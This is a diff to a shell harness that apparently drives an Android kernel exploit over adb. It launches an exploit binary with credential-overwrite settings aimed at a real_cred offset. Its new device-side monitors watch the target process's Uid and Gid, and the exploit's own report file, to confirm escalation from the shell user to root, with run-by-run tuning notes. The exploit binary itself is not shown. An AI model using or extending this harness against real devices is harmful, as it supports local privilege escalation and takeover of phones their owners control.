@@ -206,21 +206,49 @@ say "  task=$TASK child_pid=$CPID lt_parent=$PPID_LT"
 say "  baseline: $(uid_line "$CPID")"
 
 # ---------------------------------------------------------------- 5. shots
-# Continuous victim-status stream.  Started before the shots so that the readback
-# exists even if the box dies mid-sequence (run 10's landing was lost that way:
-# shot_until only read the status after the 45 s shot had returned).
-uid_trace_start() {   # $1=pid
-    [ -n "${TRACEPID:-}" ] && return 0
-    ( while :; do
-          printf '%s ' "$(date +%H:%M:%S)"
-          "$ADB" -s "$SER" shell "grep -m1 '^Uid:' /proc/$1/status; grep -m1 '^Gid:' /proc/$1/status" \
-              2>/dev/null | tr -d '\r' | tr '\n' ' '
-          echo
-          sleep 1
-      done ) >> "$OUT/uid.trace" 2>/dev/null &
-    TRACEPID=$!
+# ---------------------------------------------------------------------------
+# Instruments.  The old one polled over adb every ~2.2 s from the host, which
+# (a) competed with the shot's own adb traffic, (b) could only ever sample a
+# 20 s window, and (c) wrote "no data" as if it were "no change" (run 13).
+#
+# Now: a DEVICE-side loop on a single long-lived connection, change-triggered,
+# 50 ms, timestamped with /proc/uptime.  It emits nothing while nothing changes,
+# so it costs no adb bandwidth; and when the box dies the stream simply breaks,
+# leaving the last state before death as the last line.
+# ---------------------------------------------------------------------------
+uid_stream_start() {   # $1=pid  $2=outfile
+    [ -n "${UIDSTREAMPID:-}" ] && return 0
+    ( "$ADB" -s "$SER" shell '
+p='"$1"'
+last=x
+while [ -d /proc/$p ]; do
+  u=$(cut -d" " -f1 /proc/uptime)
+  v=$(sed -n "s/^Uid:[[:space:]]*//p" /proc/$p/status 2>/dev/null)
+  w=$(sed -n "s/^Gid:[[:space:]]*//p" /proc/$p/status 2>/dev/null)
+  n="$v|$w"
+  if [ "$n" != "$last" ]; then echo "$u $n"; last="$n"; fi
+  sleep 0.05
+done
+echo "$(cut -d" " -f1 /proc/uptime) <pid gone>"' > "$2" 2>/dev/null ) &
+    UIDSTREAMPID=$!
 }
-uid_trace_stop() { [ -n "${TRACEPID:-}" ] && kill "$TRACEPID" 2>/dev/null; TRACEPID=""; }
+
+cred_stream_start() {  # $1=outfile  (watches the child's own report file)
+    [ -n "${CREDSTREAMPID:-}" ] && return 0
+    ( "$ADB" -s "$SER" shell '
+last=x
+while :; do
+  v=$(cat '"$RES"' 2>/dev/null)
+  if [ "$v" != "$last" ]; then echo "$(cut -d" " -f1 /proc/uptime) $v"; last="$v"; fi
+  sleep 0.2
+done' > "$1" 2>/dev/null ) &
+    CREDSTREAMPID=$!
+}
+
+streams_stop() {
+    [ -n "${UIDSTREAMPID:-}" ] && kill "$UIDSTREAMPID" 2>/dev/null; UIDSTREAMPID=""
+    [ -n "${CREDSTREAMPID:-}" ] && kill "$CREDSTREAMPID" 2>/dev/null; CREDSTREAMPID=""
+}
 
 poll_uid() {   # $1=pid $2=timeout_s -> the first Uid line that is no longer 2000
     local pid=$1 t=$2 i u=""
@@ -245,10 +273,16 @@ shot() {
     local t0 t1
     t0=$(date +%s)
     detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_CHAIN_WAIT_MS=$CHAINWAIT V12_HOLD_SEC=$HOLD V12_PIN_FORK=1 V12_NODRAIN=$NODRAIN $EXTRA $extra V12B_EVIDENCE=$ev ./$(basename "$BINW") W7 > $DEV/w7_${TAG}_$tag.log 2>&1 </dev/null &"
-    local i out=""
+    local i out="" fails=0
     for i in $(seq 1 20); do
         sleep 1
         out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
+        if [ -z "$out" ]; then
+            fails=$((fails+1))
+            [ "$fails" -ge 3 ] && { say "  [$tag] 3 consecutive empty adb reads — device likely gone"; break; }
+        else
+            fails=0
+        fi
         printf '%s' "$out" | grep -q 'probe_state' && break
     done
     sleep 1
@@ -285,7 +319,8 @@ shot() {
         say "  [$tag] /proc/status must read:  Uid: 0 0 $hi 0   and   Gid first field = $lo"
     fi
     SHOT_CRED=$(printf '%s\n' "$out" | sed -n 's/.*write value = private cred page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
-    say "  [$tag] probe_state=$SHOT_PS  (D=landed, R=miss, S=blocked)"
+    [ -z "$SHOT_PS" ] && SHOT_PS=UNKNOWN
+    say "  [$tag] probe_state=$SHOT_PS  (D=landed, R=miss, S=blocked, UNKNOWN=no data)"
     return 0
 }
 
@@ -315,8 +350,8 @@ shot_until() {   # $1=off $2=extra $3=tag $4=rounds -> 0 if the readback moved
     return 1
 }
 
-say "  starting uid.trace on pid $CPID"
-uid_trace_start "$CPID"
+say "  starting uid.stream on pid $CPID (device-side, 50 ms, change-triggered)"
+uid_stream_start "$CPID" "$OUT/uid.stream"
 say "=== step 5: 0x778 shot(s) (real_cred) ==="
 if [ "$CONTROL" = "1" ]; then
     say "  ⚠ CONTROL: V12_ALLOW_INIT_CRED=1 — write_value = the init_cred image"
@@ -374,7 +409,10 @@ for i in $(seq 5 5 "$WATCH"); do
     say "  t+${i}s up=$UP services=$(svc_count)/5"
 done
 
-uid_trace_stop
+say "  starting cred.stream on $RES"
+cred_stream_start "$OUT/cred.stream"
+sleep 3
+streams_stop
 say "=== step 10: evidence ==="
 stop_klog
 say "  klog.host: $(wc -l < "$KLOG") lines, $(sort -u "$KLOG" 2>/dev/null | wc -l) unique"
